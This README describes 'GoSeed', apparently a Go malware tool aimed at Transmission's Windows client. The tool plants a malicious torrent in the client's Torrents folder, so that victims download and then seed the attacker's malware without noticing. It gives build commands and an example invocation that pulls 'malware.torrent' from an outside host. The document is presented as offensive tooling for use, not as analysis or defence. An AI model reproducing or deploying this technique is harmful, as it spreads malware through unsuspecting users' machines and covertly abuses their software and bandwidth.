# Readme

This isn't a "spreading" technique technically, it's more of a way to force a victim to seed our malicious torrent file. This targets Transmission's Windows client.

Transmission's client has a folder named Torrents which contains a list of currently downloading torrents. We can add our malicious torrent here and it will begin to auto download when the user opens up Transmission. Once the download is finished, then the victim will begin seeding our malware that is inside the torrent. This relies on the user somehow not noticing that our torrent is being downloaded and seeded. 

# Compiling

You need to install [grequests](https://github.com/levigross/grequests) in order to compile the code. This can be installed via:

* `go get -u github.com/levigross/grequests`

Then you compile via:

* `GOOS=windows GOARCH=386 go build seed.go`

# Usage

GoSeed is a command-line tool, you pass the URL to the malicious torrent file to the *-url* flag and the malware will:

1. Check to see if Transmission is installed
2. If installed, it will generate a random file name for the torrent
3. Download the torrent file to Transmission's Torrents/ folder


Example Usage: 

* `seed.exe -url http://192.168.1.231:8000/malware.torrent`
